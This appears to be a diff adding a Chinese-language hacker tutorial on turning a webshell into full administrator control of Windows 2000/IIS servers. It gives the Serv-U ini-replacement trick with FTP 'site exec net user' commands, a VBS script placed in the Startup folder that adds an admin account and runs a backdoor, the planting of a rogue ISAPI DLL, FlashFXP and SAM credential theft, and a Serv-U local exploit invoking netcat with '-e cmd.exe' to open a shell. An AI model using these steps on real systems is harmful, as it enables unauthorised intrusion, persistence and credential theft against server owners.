@@ -1,0 +1,144 @@
+ 说到花了九牛二虎的力气获得了一个webshell，  
+当然还想继续获得整个服务器的admin权限，正如不想得到admin的不是好黑客～  
+嘻嘻～～好跟我来，看看有什么可以利用的来提升权限  
+
+
+第一  
+如果服务器上有装了pcanywhere服务端，管理员为了管理方便  
+也给了我们方便，到系统盘的Documents and Settings/All Us  
+ers/Application Data/Symantec/pcAnywhere/中下载*.cif本地  
+破解就使用pcanywhere连接就ok了  
+
+第二  
+有很多小黑问我这么把webshell的iis user权限提升  
+一般服务器的管理都是本机设计完毕然后上传到空间里， 
+那么就会用到ftp，服务器使用最多的就是servu  
+那么我们就利用servu来提升权限  
+通过servu提升权限需要servu安装目录可写～  
+  
+  
+好开始把，首先通过webshell访问servu安装文件夹下的ServUDaemon.ini把他下载  
+下来，然后在本机上安装一个servu把ServUDaemon.ini放到本地安装文件夹下覆盖，  
+启动servu添加了一个用户，设置为系统管理员，目录C:\，具有可执行权限  
+然后去servu安装目录里把ServUDaemon.ini更换服务器上的。  
+用我新建的用户和密码连接～  
+好的，还是连上了  
+
+ftp  
+ftp>open ip  
+Connected to ip.  
+220 Serv-U FTP Server v5.0.0.4 for WinSock ready...  
+User (ip:(none)): id //刚才添加的用户  
+331 User name okay, please send complete E-mail address as password.  
+Password:password //密码  
+230 User logged in, proceed.  
+ftp> cd winnt //进入win2k的winnt目录  
+250 Directory changed to /WINNT  
+ftp>cd system32 //进入system32目录  
+250 Directory changed to /WINNT/system32  
+ftp>quote site exec net.exe user rover rover1234 /add //利用系统的net.exe  
+
+文件加用户。  
+如果提示没有权限，那我们就  
+把后门（server.exe） 传他system32目录  
+然后写一个VBs教本  
+
+set wshshell=createobject ("wscript.shell")  
+a=wshshell.run ("cmd.exe /c net user user pass /add",0)  
+b=wshshell.run ("cmd.exe /c net localgroup Administrators user /add",0)  
+b=wshshell.run ("cmd.exe /c server.exe",0)  
+  
+存为xx.vbe  
+这个教本的作用是建立user用户密码为pass  
+并且提升为管理员  
+然后执行system32目录下的server.exe  
+把这个教本传他 C:\Documents and Settings\All Users\「开始」菜单\程序\启动  
+目录  
+这样管理员只要一登陆就会执行那个教本.  
+接下来就是等了.等他登陆.  
+
+第三  
+
+就是先检查有什么系统服务，或者随系统启动自动启动的程序和管理员经常使用的软件， 比如诺顿，VAdministrator，金山，瑞星,WinRAR甚至QQ之类的，是否可以写，如果可以就修改其程序， 绑定一个批处理或者VBS，然后还是等待服务器重启。  
+
+
+第四  
+
+查找conn和config ,pass这类型的文件看能否得到sa或者mysql的相关密码，可能会有所  
+收获等等。  
+  
+第五  
+
+使用Flashfxp也能提升权限，但是成功率就看你自己的运气了  
+首先找到FlashFXP文件夹，打开(编辑)Sites. dat，这个文件这是什么东西密码和用户名，  
+而且密码是加了密的。 如果我把这些文件copy回本地也就是我的计算机中，替换我本地的相应文件。然后会发现 打开flashfxp在站点中打开站点管理器一样。又可以添加N多肉鸡啦～～嘻嘻～  
+唔？？不对啊，是来提升权限的啊，晕，接着来别半途而废。  
+大家看看对方管理员的这站点管理器，有用户名和密码，密码是星号的。经过用xp星号密码 查看器查看，然后和Sites.dat中加密了密码做比较发现并未加密而是查到的密码是明文显示， 然后最终把这个网站管理员的密码从这堆东西中找  
+出来。那么下一步就可以链接这些新的服务器啦～～  
+经过测试只要把含有密码和用户名的Sites.dat文件替换到本地相应的文件就可以在本地  
+还原对方管理员的各个站点的密码。  
+
+
+第六 
+WIN2K+IIS5.0默认情况下应用程序保护选项是"中（共用的）"，这时IIS加载isapi是用的  
+iwam_computername用户身份执行。  
+但默认情况下WIN2K+IIS5对于一些特殊isapi又要以system身份加载。win2k+iis5 、  
+win2k+iis5+sp1、win2k+iis5+sp2都是简单的判断isapi的文件名，并且没有做目录限制，  
+以SYSTEM权限加载的isapi有：  
+1、 idq.dll  
+2、 httpext.dll  
+3、 httpodbc.dll  
+4、 ssinc.dll  
+5、 msw3prt.dll  
+6、 author.dll  
+7、 admin.dll  
+8、 shtml.dll  
+9、 sspifilt.dll  
+10、compfilt.dll  
+11、pwsdata.dll  
+12、md5filt.dll  
+13、fpexedll.dll  
+所以利用这很容易得到SYSTEM权限。并且判断文件名的时候有个bug，比如请求/scripts/test%81%5cssinc.dll也将会认为是请求的ssinc.dll,就是分离文件路径的时候没有考虑到双字节的 远东版问题。ssinc.dll在处理包含文件路径的时候也有一个问题，就是"/"、"\"只识别了一个 "/"，所以如果请求里面使用"\"，就会错误的处理包含文件路径，有可能泄露东西或者出现权限 漏洞，这种漏洞很多别的地方（ php、asp等）也还存在。  
+加载这些isapi不是单以文件名做依据了，而是加了路径，应该是修正了此问题。  
+一般默认情况下是：  
+1、 idq.dll d:\winnt\system32\idq.dll  
+2、 httpext.dll d:\winnt\system32\inetsrv\httpext.dll  
+3、 httpodbc.dll d:\winnt\system32\inetsrv\httpodbc.dll  
+4、 ssinc.dll d:\winnt\system32\inrtsrv\ssinc.dll  
+5、 msw3prt.dll d:\winnt\system32\msw3prt.dll  
+6、 author.dll D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\_vti_aut\author.dll  
+7、 admin.dll D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\_vti_adm\admin.dll  
+8、 shtml.dll D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\shtml.dll  
+9、 sspifilt.dll d:\winnt\system32\inetsrv\sspifilt.dll  
+10、compfilt.dll d:\winnt\system32\inetsrv\compfilt.dll  
+11、pwsdata.dll d:\winnt\system32\inetsrv\pwsdata.dll  
+12、md5filt.dll d:\winnt\system32\inetsrv\md5filt.dll  
+13、fpexedll.dll D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\bin\fpexedll.dll  
+正常情况下这些路径都guest不能写,但如果配置不好，这些路径iis user能够写了就一样可以提升权限了  
+可以把ISAPIHack.dll上传到IIS的可执行目录，文件名可叫ssinc.dll或者admin.dll等（上面列的13个文件名之一）。  
+然后等待IIS重启加载此dll，就可以获得权限了  
+
+第七 
+  
+下载系统的 %windir%\repair\sam.*（WinNT 4下是sam._ 而Windows 2000下是sam）文件，  
+然后用L0pht等软件进行破解，只要能拿到，肯花时间，就一定可以破解。  
+
+
+第八 
+
+PipeUpAdmin（Windows 2000下）, 在本机运行可以把当前用户帐号加入管理员组。普通用户和Guests组用户都可以成功运行。  
+
+
+第九  
+
+Serv-u Ftp Server 本地权限提升漏洞：  
+很多主机的C:\Documents and Settings\All Users\ Documents目录以及下边几个子目录Documents没有设置权限，导致可以在这个目录上传并运行Exp. 直接上传了serv-u local exploit 和nc, 并且把serv-u的本地提升权限的名字命名为su.exe 文件就放在C:\Documents and Settings\All Users\ Documents, 然后我们用su.exe直接建立用户,也可以反弹一个shell过来的。  
+具体命令：  
+建立用户: serv-u.exe "cmd"  
+>USER xl  
+>PASS 111111  
+反弹shell: serv-u.exe "nc.exe -l -p 99 -e cmd.exe"  
+
+ 
+ 
+ 
